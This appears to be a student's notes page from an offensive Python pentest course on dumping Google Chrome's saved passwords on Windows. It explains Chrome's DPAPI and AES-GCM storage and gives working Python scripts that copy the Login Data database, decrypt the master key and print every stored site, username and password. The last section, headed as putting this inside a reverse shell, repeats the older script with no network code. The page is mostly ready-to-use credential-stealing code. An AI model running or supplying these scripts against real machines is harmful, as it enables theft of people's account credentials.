---
title: Dumping saved passwords from Google Chrome
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - keylogger
---

# Dumping saved passwords from Google Chrome

From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).

??? abstract "General index of the course"
	- Gaining persistence shells (TCP + HTTP):
		- [Coding a TCP connection and a reverse shell](coding-a-tcp-reverse-shell.md).
		- [Coding a low level data exfiltration  - TCP connection](coding-a-low-level-data-exfiltration-tcp.md).
		- [Coding an http reverse shell](coding-an-http-reverse-shell.md).
		- [Coding a data exfiltration script for a http shell](coding-a-data-exfiltration-script-http-shell.md).
		- [Tunning the connection attempts](tunning-the-connection-attemps.md).
		- [Including cd command into TCP reverse shell](including-cd-command-into-tcp-reverse-shell.md).
	- Advanced scriptable shells:
		- [Using a Dynamic DNS instead of your bared attacker public ip](ddns-aware-shell.md).
		- [Making your binary persistent](making-your-binary-persistent.md). 
		- [Making a screenshot](making-a-screenshot.md). 
		- [Coding a reverse shell that searches files](coding-a-reverse-shell-that-searches-files.md). 
	- Techniques for bypassing filters: 
		- [Coding a reverse shell that scans ports](coding-a-reverse-shell-that-scans-ports.md). 
		- [Hickjack the Internet Explorer process to bypass an host-based firewall](hickjack-internet-explorer-process-to-bypass-an-host-based-firewall.md).
		- [Bypassing Next Generation Firewalls](bypassing-next-generation-firewalls.md).
		- [Bypassing IPS with handmade XOR Encryption](bypassing-ips-with-handmade-xor-encryption.md).
	- Malware and crytography:
		- [TCP reverse shell with AES encryption](tcp-reverse-shell-with-aes-encryption.md).
		- [TCP reverse shell with RSA encryption](tcp-reverse-shell-with-rsa-encryption.md).
		- [TCP reverse shell with hybrid encryption AES + RSA](tcp-reverse-shell-with-hybrid-encryption-rsa-aes.md).
	- Password Hickjacking:
		- [Simple keylogger in python](python-keylogger.md).
		- [Hijacking Keepass Password Manager](hijacking-keepass.md).
		- [Dumping saved passwords from Google Chrome](dumping-chrome-saved-passwords.md).
		- [Man in the browser attack](man-in-the-browser-attack.md).
		- [DNS Poisoning](dns-poisoning.md).
	- Privilege escalation:
		- [Weak service file permission](privilege-escalation.md).


## How does Chrome saved passwords work?

Chrome uses windows session password to encrypt and decrypt saved passwords. Encrypted passwords are stored  in a SQlite  db called 'Login Data DB' located at:

```
C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default
```

Chrome calls to the windows API function called "CryptProtectData", which uses the windows login password as an encryption key and in reverse operation a windows API function called "CryptUnprotectData" to decrypt the password value back to clear text.

**1.** Install sqlite from: https://sqlitebrowser.org/dl/

**2.** Open DB Browser sqlite.

**3.** In your windows explorer, go to the path where sqlite db is stored and  copy the file "Login Data" to your Desktop.

**4.** Change the extension of "Login Data" file to .sqlite3

**5.** Open "Login Data.sqlite3" in DB Browser sqlite.

**6.** Go to tab "Browse Data" (Hoja de Datos in spanish) and select the table login. There you have all stored passwords.


## Our script

The route map for this script will be:

**1.** Guessing the path to sqlite database: username and browser used by the victim.

```
C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default
```

**2.** Sending the password value from a column in "logins" table, in "Login Data.sqlite3" to function CryptUn ProtectData.

**3.** Send the passwords through a reverse shell.

### Script for gathering passwords

Here is the script provided in the course (it doesn't work, below I've pasted a different one that works):

```python
# Python For Offensive PenTest: A Complete Practical Course  - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


from os import getenv 
# To find out the Chrome SQL path- C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data

import sqlite3 # To read the Chrome SQLite DB

import win32crypt  # High level library to call windows API CryptUnprotectData

from shutil import copyfile # To make a copy of the Chrome SQLite DB


# LOCALAPPDATA is a Windows Environment Variable which points to >>> C:\Users\{username}\AppData\Local
path = getenv("LOCALAPPDATA")+r"\Google\Chrome\User Data\Default\Login Data"

# make a copy the Login Data DB and pull data out of the copied DB, so there are no conflicts in case that the user is using the original (maybe she is logged into facebook, let's say)
path2 = getenv("LOCALAPPDATA")+r"\Google\Chrome\User Data\Default\Login2"
copyfile(path, path2)

# Connect to the copied Database
conn = sqlite3.connect(path2)


cursor = conn.cursor() #Create a Cursor object and call its execute() method to perform SQL commands like SELECT

# SELECT column_name,column_name FROM table_name
# SELECT action_url and username_value and password_value FROM table logins
cursor.execute('SELECT action_url, username_value, password_value FROM logins')


# To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.
for raw in cursor.fetchall():

    print(raw[0] + '\n' + raw[1]) # print the action_url (raw[0]) and print the username_value (raw[1])

    password = win32crypt.CryptUnprotectData(raw[2])[1] # pass the encrypted Password to CryptUnprotectData API function to decrypt it  

    print(password)
conn.close()


```


Script that works. These are requirements:

```
pip install PyCryptodome
```


Script:

```python
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        return "Chrome < 80"
 

master_key = get_master_key()
login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
try:
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        encrypted_password = r[2]
        decrypted_password = decrypt_password(encrypted_password, master_key)
        if len(username) > 0:
            print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
except Exception as e:
    pass
cursor.close()
conn.close()
try:
    os.remove("Loginvault.db")
except Exception as e:
    pass
```


### Script with gathering passwords phase integrated in a reverse shell


```python
# Python For Offensive PenTest: A Complete Practical Course  - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

import json
import base64
from os import getenv 
# To find out the Chrome SQL path- C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data

import sqlite3 # To read the Chrome SQLite DB
from Crypto.Cipher import AES
import win32crypt  # High level library to call windows API CryptUnprotectData

from shutil import copyfile # To make a copy of the Chrome SQLite DB


# LOCALAPPDATA is a Windows Environment Variable which points to >>> C:\Users\{username}\AppData\Local
path = getenv("LOCALAPPDATA")+r"\Google\Chrome\User Data\Default\Login Data"

# make a copy the Login Data DB and pull data out of the copied DB
path2 = getenv("LOCALAPPDATA")+r"\Google\Chrome\User Data\Default\Login2"
copyfile(path, path2)

# Connect to the copied Database
conn = sqlite3.connect(path2)


cursor = conn.cursor() #Create a Cursor object and call its execute() method to perform SQL commands like SELECT

# SELECT column_name,column_name FROM table_name
# SELECT action_url and username_value and password_value FROM table logins
cursor.execute('SELECT action_url, username_value, password_value FROM logins')


# To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.
for raw in cursor.fetchall():

    print(raw[0] + '\n' + raw[1]) # print the action_url (raw[0]) and print the username_value (raw[1])

    password = win32crypt.CryptUnprotectData(raw[2])[1] # pass the encrypted Password to CryptUnprotectData API function to decrypt it  

    print(password)
conn.close()
```